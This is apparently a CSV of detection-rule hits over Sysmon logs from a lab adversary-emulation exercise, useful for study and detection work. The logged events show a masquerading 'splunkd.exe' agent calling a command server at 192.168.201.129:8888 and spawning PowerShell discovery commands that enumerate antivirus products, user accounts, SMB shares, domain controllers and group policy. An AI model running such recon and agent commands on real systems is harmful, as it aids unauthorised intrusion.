"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 13:56:38.622 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172552,"Cmdline: C:\WINDOWS\system32\svchost.exe -k GPSvcGroup ¦ Proc: C:\Windows\System32\svchost.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\services.exe ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 4408 ¦ PGUID: E9F06A57-9186-694A-8602-000000002300 ¦ ParentPID: 776 ¦ ParentPGUID: E9F06A57-7C72-694A-0B00-000000002300 ¦ Description: Host Process for Windows Services ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0CD128F416A04C06D50EC56392C25D9F,SHA256=324451797AC909A4DD40C7A2F7347EF91F6B7C786941AD5035F609C0FC15EDAA,IMPHASH=DE43BD45CC98C143357416C7519ECCFD","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: svchost.exe ¦ ParentImage: C:\Windows\System32\services.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 12:56:38.616","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:57:22.963 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172555,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$NameSpace = Get-WmiObject -Namespace \""root\"" -Class \""__Namespace\"" | Select Name | Out-String -Stream | Select-String \""SecurityCenter\"";$SecurityCenter = $NameSpace | Select-Object -First 1;Get-WmiObject -Namespace \""root\$SecurityCenter\"" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8188 ¦ PGUID: E9F06A57-91B2-694A-8702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:57:22.954","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:57:35.547 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172557,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /ua /installsource scheduler ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 6256 ¦ PGUID: E9F06A57-91BF-694A-8802-000000002300 ¦ ParentPID: 1340 ¦ ParentPGUID: E9F06A57-7C75-694A-1A00-000000002300 ¦ Description: Microsoft Edge Update ¦ Product: Microsoft Edge Update ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B299AA9A27C330A9B44E45BD1595DBEA,SHA256=955B5950FD92E5C5EEC395B022566C9A2594CA3126D894408E2E29BA25D8B0DD,IMPHASH=CD3B2D99C6655A5D4A14E30E380F5BF9","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 1.3.215.9 ¦ IntegrityLevel: System ¦ OriginalFileName: msedgeupdate.dll ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 12:57:35.539","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:58:40.658 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172558,"Cmdline: ""C:\WINDOWS\system32\wermgr.exe"" -upload ¦ Proc: C:\Windows\System32\wermgr.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 8184 ¦ PGUID: E9F06A57-9200-694A-8A02-000000002300 ¦ ParentPID: 1340 ¦ ParentPGUID: E9F06A57-7C75-694A-1A00-000000002300 ¦ Description: Windows Problem Reporting ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=C2F05819790AC243FC54185DCBF6E97A,SHA256=D810BF4195F651889AD4806876D3FB65E3D33FD439BD9CA1B2E8CA746F13C750,IMPHASH=2FEAC3143808B4542A16622000CCFCAE","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: WerMgr ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 12:58:40.653","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:54:49.014 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172542,"Cmdline: ""C:\WINDOWS\system32\nltest.exe"" /dsgetdc:DESKTOP-G2OBL3D ¦ Proc: C:\Windows\System32\nltest.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""nltest /dsgetdc:$env:USERDOMAIN"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3316 ¦ PGUID: E9F06A57-9119-694A-7A02-000000002300 ¦ ParentPID: 4080 ¦ ParentPGUID: E9F06A57-9118-694A-7902-000000002300 ¦ Description: Microsoft® Logon Server Test Utility ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=82FE62A6189783B708F5A83B33471DE4,SHA256=E156A71035B49528537621025AE549A84C2DE398C36040FA246761A50053D9D1,IMPHASH=FEBD12F085BCFE72F52871203AB1612D","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: nltestrk.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:54:49.012","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:56:31.156 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172551,"Cmdline: ""C:\WINDOWS\system32\gpresult.exe"" /R ¦ Proc: C:\Windows\System32\gpresult.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""gpresult /R"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4124 ¦ PGUID: E9F06A57-917F-694A-8402-000000002300 ¦ ParentPID: 4064 ¦ ParentPGUID: E9F06A57-917E-694A-8302-000000002300 ¦ Description: Query Group Policy RSOP Data ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A645F6353FAD89A4B1E1CAADB17C355B,SHA256=A6CF42B006685EFBCE141D29756B6085A00C16B9DA065FCA572A76BCEB8C5D2F,IMPHASH=42C93E4033FE774F76CBBA44B5475640","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: gprslt.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:56:31.154","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:54:57.227 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",172543,"Query: _ldap._tcp.dc._msdcs.DESKTOP-G2OBL3D ¦ Result: - ¦ Proc: C:\Windows\System32\nltest.exe ¦ PID: 3316 ¦ PGUID: E9F06A57-9119-694A-7A02-000000002300","QueryStatus: 1460 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 12:54:56.073","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:56:40.064 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",172553,"Query: _ldap._tcp.dc._msdcs.DESKTOP-G2OBL3D ¦ Result: - ¦ Proc: C:\Windows\System32\gpresult.exe ¦ PID: 4124 ¦ PGUID: E9F06A57-917F-694A-8402-000000002300","QueryStatus: 1460 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 12:56:38.549","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:56:48.765 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",172554,"Query: _ldap._tcp.dc._msdcs.DESKTOP-HORECK0 ¦ Result: - ¦ Proc: C:\Windows\System32\gpresult.exe ¦ PID: 4124 ¦ PGUID: E9F06A57-917F-694A-8402-000000002300","QueryStatus: 1460 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 12:56:46.758","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:54:49.014 +01:00","Nltest.EXE Execution","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1016 ¦ T1018 ¦ T1482","sysmon",172542,"Cmdline: ""C:\WINDOWS\system32\nltest.exe"" /dsgetdc:DESKTOP-G2OBL3D ¦ Proc: C:\Windows\System32\nltest.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""nltest /dsgetdc:$env:USERDOMAIN"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3316 ¦ PGUID: E9F06A57-9119-694A-7A02-000000002300 ¦ ParentPID: 4080 ¦ ParentPGUID: E9F06A57-9118-694A-7902-000000002300 ¦ Description: Microsoft® Logon Server Test Utility ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=82FE62A6189783B708F5A83B33471DE4,SHA256=E156A71035B49528537621025AE549A84C2DE398C36040FA246761A50053D9D1,IMPHASH=FEBD12F085BCFE72F52871203AB1612D","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: nltestrk.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:54:49.012","proc_creation_win_nltest_execution.yml","eadb0b0a-eb40-d866-06be-ba5d9ca424d7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:54:49.014 +01:00","Potential Recon Activity Via Nltest.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1016 ¦ T1482","sysmon",172542,"Cmdline: ""C:\WINDOWS\system32\nltest.exe"" /dsgetdc:DESKTOP-G2OBL3D ¦ Proc: C:\Windows\System32\nltest.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""nltest /dsgetdc:$env:USERDOMAIN"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3316 ¦ PGUID: E9F06A57-9119-694A-7A02-000000002300 ¦ ParentPID: 4080 ¦ ParentPGUID: E9F06A57-9118-694A-7902-000000002300 ¦ Description: Microsoft® Logon Server Test Utility ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=82FE62A6189783B708F5A83B33471DE4,SHA256=E156A71035B49528537621025AE549A84C2DE398C36040FA246761A50053D9D1,IMPHASH=FEBD12F085BCFE72F52871203AB1612D","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: nltestrk.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:54:49.012","proc_creation_win_nltest_recon.yml","85352b19-fe33-7d68-49ea-839a7bdc5292","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:51:39.678 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172530,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C $env:username ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1452 ¦ PGUID: E9F06A57-905B-694A-7102-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:51:39.661","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:52:25.675 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172532,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Get-WmiObject -Class Win32_UserAccount"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 7612 ¦ PGUID: E9F06A57-9089-694A-7202-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:52:25.668","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:53:26.716 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172534,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$owners = @{};gwmi win32_process |%% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=\""Owner\"";e={$owners[$_.id.tostring()]}};foreach($p in $ps) { if($p.Owner -eq \""student\"") { $p; }}"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1308 ¦ PGUID: E9F06A57-90C6-694A-7302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:53:26.706","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:54:11.753 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172536,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Get-SmbShare | ConvertTo-Json"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4440 ¦ PGUID: E9F06A57-90F3-694A-7402-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:54:11.745","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:54:48.777 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172540,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""nltest /dsgetdc:$env:USERDOMAIN"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4080 ¦ PGUID: E9F06A57-9118-694A-7902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:54:48.770","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:55:51.004 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172546,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6004 ¦ PGUID: E9F06A57-9156-694A-7D02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:55:50.989","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:56:30.934 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172549,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""gpresult /R"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4064 ¦ PGUID: E9F06A57-917E-694A-8302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:56:30.927","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:57:22.963 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172555,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$NameSpace = Get-WmiObject -Namespace \""root\"" -Class \""__Namespace\"" | Select Name | Out-String -Stream | Select-String \""SecurityCenter\"";$SecurityCenter = $NameSpace | Select-Object -First 1;Get-WmiObject -Namespace \""root\$SecurityCenter\"" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8188 ¦ PGUID: E9F06A57-91B2-694A-8702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:57:22.954","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_discovery.evtx"
